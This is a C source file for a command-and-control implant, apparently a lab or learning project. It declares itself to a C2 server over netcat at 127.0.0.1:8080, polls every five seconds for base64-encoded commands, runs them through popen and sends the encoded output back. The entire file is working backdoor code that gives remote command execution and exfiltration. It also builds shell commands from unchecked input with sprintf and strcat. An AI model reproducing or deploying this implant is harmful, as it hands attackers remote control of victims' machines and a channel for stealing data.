#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

// ANSI color code definitions
#define COLOR_RED     "\033[31m"
#define COLOR_GREEN   "\033[32m"
#define COLOR_YELLOW  "\033[33m"
#define COLOR_BLUE    "\033[34m"
#define COLOR_MAGENTA "\033[35m"
#define COLOR_CYAN    "\033[36m"
#define COLOR_RESET   "\033[0m"

// Implant UID - will be retrieved after first DECLARE connection
char IMPLANT_UID[20] = "f92400cf0d"; // Default value, will be updated

// Function to execute a command and return the result
void execve_command(const char *command, const char *argument, const char *task_uid) {
    char cmd[1024];
    char result[4096] = {0};
    FILE *fp;

    // Build and execute the command
    sprintf(cmd, "%s %s", command, argument);
    printf(COLOR_YELLOW "Executing: %s\n" COLOR_RESET, cmd);
    
    fp = popen(cmd, "r");
    if (fp != NULL) {
        char buffer[1024];
        while (fgets(buffer, sizeof(buffer), fp) != NULL) {
            strcat(result, buffer);
        }
        pclose(fp);
    }
    
    printf("\n--- Raw result ---\n%s\n--- End raw result ---\n", result);
    
    // Encode the result in base64
    char base64_cmd[8192];
    char encoded_result[8192] = {0};
    FILE *fp_encode;
    
    // Create a temporary file to store the result
    char temp_file[] = "/tmp/cmd_result_XXXXXX";
    int fd = mkstemp(temp_file);
    if (fd != -1) {
        FILE *tmp_fp = fdopen(fd, "w");
        if (tmp_fp != NULL) {
            fputs(result, tmp_fp);
            fclose(tmp_fp);
            
            // Base64 encode the file
            sprintf(base64_cmd, "base64 -w 0 %s", temp_file);
            fp_encode = popen(base64_cmd, "r");
            if (fp_encode != NULL) {
                if (fgets(encoded_result, sizeof(encoded_result), fp_encode) != NULL) {
                    // Remove newline at the end if present
                    encoded_result[strcspn(encoded_result, "\n")] = 0;
                    printf("Base64 encoded result: %s\n", encoded_result);
                }
                pclose(fp_encode);
            }
            
            // Delete temporary file
            unlink(temp_file);
        }
    }

    // Send the encoded result to the server using netcat
    char send_cmd[16384];
    sprintf(send_cmd, "echo 'RESULT,%s,%s,%s' | nc 127.0.0.1 8080", 
            IMPLANT_UID, task_uid, encoded_result);
    printf(COLOR_CYAN "RESULT command: RESULT,%s,%s,[encoded data]\n" COLOR_RESET, 
           IMPLANT_UID, task_uid);
    printf(COLOR_GREEN "Sending result to server...\n" COLOR_RESET);
    system(send_cmd);
}

// Function to declare the implant to the server
char* declare_to_server() {
    char buffer[1024] = {0};
    FILE *fp;
    
    // Use hardcoded keccak@linux for declaration
    const char *username = "keccak";
    const char *hostname = "linux";
    
    // Send declaration and retrieve UID
    char command[1024];
    sprintf(command, "echo 'DECLARE,%s,%s,linux' | nc 127.0.0.1 8080", 
            username, hostname);
    
    printf(COLOR_MAGENTA "DECLARE command: DECLARE,%s,%s,linux\n" COLOR_RESET, 
           username, hostname);
           
    fp = popen(command, "r");
    if (fp != NULL) {
        if (fgets(buffer, sizeof(buffer), fp) != NULL) {
            // Response should be "OK,<uid>"
            printf(COLOR_BLUE "Server response: %s\n" COLOR_RESET, buffer);
            
            // Extract the UID
            char *token = strtok(buffer, ",");
            if (token != NULL && strcmp(token, "OK") == 0) {
                token = strtok(NULL, ",");
                if (token != NULL) {
                    // Remove newline if present
                    token[strcspn(token, "\n")] = 0;
                    
                    char *uid = strdup(token);
                    pclose(fp);
                    return uid;
                }
            }
        }
        pclose(fp);
    }
    
    return NULL;
}

// Function to check if there are tasks to execute
void fetch_tasks(const char* uid) {
    char command[1024];
    char result[4096] = {0};
    FILE *fp;
    
    // Prepare FETCH command with UID
    sprintf(command, "echo 'FETCH,%s' | nc 127.0.0.1 8080", uid);
    
    printf("\n" COLOR_GREEN "Checking for tasks...\n" COLOR_RESET);
    printf(COLOR_CYAN "FETCH command: FETCH,%s\n" COLOR_RESET, uid);
    
    fp = popen(command, "r");
    if (fp != NULL) {
        if (fgets(result, sizeof(result), fp) != NULL) {
            printf(COLOR_BLUE "Server response: %s" COLOR_RESET, result);
            
            // Split the string by commas
            char *cmd_type = strtok(result, ",");
            
            if (cmd_type && strcmp(cmd_type, "EXECVE") == 0) {
                char *task_uid = strtok(NULL, ",");
                char *cmd_base64 = strtok(NULL, ",");
                char *args_base64 = strtok(NULL, ",");
                
                if (task_uid && cmd_base64 && args_base64) {
                    // Remove newline at the end if present
                    args_base64[strcspn(args_base64, "\n")] = 0;
                    
                    // Decode command and arguments from base64
                    char decode_cmd[1024];
                    char decoded_cmd[1024] = {0};
                    char decoded_args[1024] = {0};
                    FILE *fp_decode;
                    
                    // Decode command
                    sprintf(decode_cmd, "echo -n %s | base64 -d", cmd_base64);
                    fp_decode = popen(decode_cmd, "r");
                    if (fp_decode) {
                        fgets(decoded_cmd, sizeof(decoded_cmd), fp_decode);
                        pclose(fp_decode);
                    }
                    
                    // Decode arguments
                    sprintf(decode_cmd, "echo -n %s | base64 -d", args_base64);
                    fp_decode = popen(decode_cmd, "r");
                    if (fp_decode) {
                        fgets(decoded_args, sizeof(decoded_args), fp_decode);
                        pclose(fp_decode);
                    }
                    
                    // Execute the command
                    printf("Decoded command: %s\n", decoded_cmd);
                    printf("Decoded arguments: %s\n", decoded_args);
                    execve_command(decoded_cmd, decoded_args, task_uid);
                }
            }
        }
        pclose(fp);
    }
}

int main() {
    char *uid = NULL;
    
    // Declare the implant and retrieve its UID
    printf(COLOR_GREEN "Declaring implant to C2 server...\n" COLOR_RESET);
    uid = declare_to_server();
    
    if (uid != NULL) {
        printf(COLOR_GREEN "Implant declared with UID: %s\n" COLOR_RESET, uid);
        
        // Update IMPLANT_UID with the new value
        strcpy(IMPLANT_UID, uid);
        
        // Main loop: check for tasks every 5 seconds
        while (1) {
            fetch_tasks(uid);
            sleep(5);  // 5 second pause
        }
        
        free(uid);
    } else {
        printf(COLOR_RED "Failed to declare implant.\n" COLOR_RESET);
    }
    
    return 0;
}